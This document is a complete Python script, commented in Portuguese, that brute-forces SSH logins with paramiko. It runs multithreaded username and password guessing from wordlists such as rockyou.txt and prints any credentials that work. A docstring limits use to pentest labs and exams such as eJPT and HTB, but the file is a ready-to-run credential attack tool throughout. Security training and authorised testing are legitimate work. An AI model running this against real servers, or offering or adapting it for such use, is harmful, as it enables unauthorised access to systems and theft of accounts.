#!/usr/bin/env python3
"""
ssh_brute.py — bruteforce SSH via paramiko (fallback do hydra, que nesta máquina
foi compilado SEM libssh e não tem módulo ssh).

Uso:
  ssh_brute.py -t 127.0.0.1 -p 2222 -l msfadmin -P /usr/share/wordlists/rockyou.txt
  ssh_brute.py -t 10.10.10.5 -l users.txt -P pass.txt            # userlist + passlist
  ssh_brute.py -t 10.10.10.5 -L users.txt -P pass.txt -T 8       # 8 threads
  ssh_brute.py -t 10.10.10.5 -l root -p toor                     # credencial única

Autorizado apenas em labs/exames com permissão (eJPT, HTB, THM, DVWA).
"""
import argparse
import sys
import threading
import time
from queue import Queue

try:
    import paramiko
except ImportError:
    sys.exit("paramiko ausente: uv pip install --python ~/venvs/pentest/bin/python paramiko")


def read_lines(path):
    with open(path, "r", errors="ignore") as fh:
        return [ln.strip() for ln in fh if ln.strip()]


def try_login(host, port, user, password, timeout):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cli.connect(hostname=host, port=port, username=user, password=password,
                    timeout=timeout, allow_agent=False, look_for_keys=False,
                    banner_timeout=timeout, auth_timeout=timeout)
        return True, None
    except paramiko.AuthenticationException:
        return False, None
    except Exception as exc:  # conexão recusada, timeout, etc.
        return False, exc
    finally:
        try:
            cli.close()
        except Exception:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", required=True)
    ap.add_argument("-p", "--port", type=int, default=22)
    ap.add_argument("-l", "--login", help="usuário único OU arquivo de usuários")
    ap.add_argument("-L", "--login-file", help="arquivo de usuários")
    ap.add_argument("-P", "--pass-file", help="arquivo de senhas")
    ap.add_argument("-w", "--password", help="senha única")
    ap.add_argument("-T", "--threads", type=int, default=4)
    ap.add_argument("--timeout", type=float, default=6.0)
    ap.add_argument("-s", "--stop", action="store_true", help="parar no primeiro acerto")
    args = ap.parse_args()

    if args.login_file:
        users = read_lines(args.login_file)
    elif args.login:
        import os
        users = read_lines(args.login) if os.path.isfile(args.login) else [args.login]
    else:
        sys.exit("informe -l usuario | -l arquivo | -L arquivo")

    if args.pass_file:
        passwords = read_lines(args.pass_file)
    elif args.password:
        passwords = [args.password]
    else:
        sys.exit("informe -P arquivo | -w senha")

    combos = Queue()
    for u in users:
        for p in passwords:
            combos.put((u, p))

    total = combos.qsize()
    print(f"[*] alvo {args.target}:{args.port} | {len(users)} usuario(s) x "
          f"{len(passwords)} senha(s) = {total} tentativas | {args.threads} threads")
    found, lock, stop_flag = [], threading.Lock(), threading.Event()
    done = [0]
    start = time.time()

    def worker():
        while not stop_flag.is_set():
            try:
                user, password = combos.get_nowait()
            except Exception:
                return
            ok, err = try_login(args.target, args.port, user, password, args.timeout)
            with lock:
                done[0] += 1
                if ok:
                    print(f"\n[+] SUCESSO: {user}:{password}")
                    found.append((user, password))
                    if args.stop:
                        stop_flag.set()
                elif err is not None and done[0] <= 3:
                    print(f"[!] erro de conexão ({user}): {err}")
                if not args.stop and done[0] % 25 == 0:
                    rate = done[0] / max(time.time() - start, 0.001)
                    print(f"    ... {done[0]}/{total} ({rate:.1f} tent/s)", flush=True)
            combos.task_done()

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(args.threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    elapsed = time.time() - start
    print(f"\n[*] {done[0]} tentativas em {elapsed:.1f}s")
    if found:
        for u, p in found:
            print(f"[+] válido -> {u}:{p}")
        return 0
    print("[-] nenhuma credencial válida")
    return 1


if __name__ == "__main__":
    sys.exit(main())
